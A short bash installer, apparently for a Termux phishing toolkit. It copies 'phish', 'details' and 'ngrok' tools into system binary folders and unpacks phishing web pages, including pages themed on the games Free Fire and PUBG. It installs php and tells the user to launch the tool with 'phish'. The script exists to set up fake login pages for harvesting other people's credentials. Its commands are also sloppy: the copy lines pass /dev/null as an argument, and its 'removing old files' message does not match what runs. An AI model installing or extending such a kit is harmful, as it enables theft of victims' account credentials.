#! /bin/bash
echo "removing all old phishing files"
sleep 10
cp -r details /bin /dev/null 2>&1  &
cp -r phish /bin /dev/null 2>&1  &
cp -r ngrok /bin /dev/null 2>&1  &
chmod 775 /bin/phish /dev/null 2>&1  &
chmod 775 /bin/details /dev/null 2>&1  &
chmod 775 /bin/ngrok /dev/null 2>&1  &
cp -r details /data/data/com.termux/files/usr/bin /dev/null 2>&1  &
cp -r phish /data/data/com.termux/files/usr/bin /dev/null 2>&1  &
cp -r ngrok /data/data/com.termux/files/usr/bin /dev/null 2>&1  &
chmod 775 /data/data/com.termux/files/usr/bin/phish /dev/null 2>&1  &
chmod 775 /data/data/com.termux/files/usr/bin/details /dev/null 2>&1  &
chmod 775 /data/data/com.termux/files/usr/bin/ngrok /dev/null 2>&1  &
echo "installing files" 
sleep 10
mkdir WebPages
unzip WebPages1.zip
unzip WebPages2.zip
unzip WebPages3.zip
unzip games.zip
mkdir games
mv freefire games
mv pubg games
mv WebPages1 WebPages
mv WebPages2 WebPages
mv  WebPages3 WebPages
mv games WebPages
rm -rf WebPages1.zip
rm -rf games.zip
rm -rf WebPages2.zip
rm -rf WebPages3.zip
chmod +x *
apt-get install ruby -y
gem install lolcat
apt-get install php -y



echo "run tool by writing -- phish"
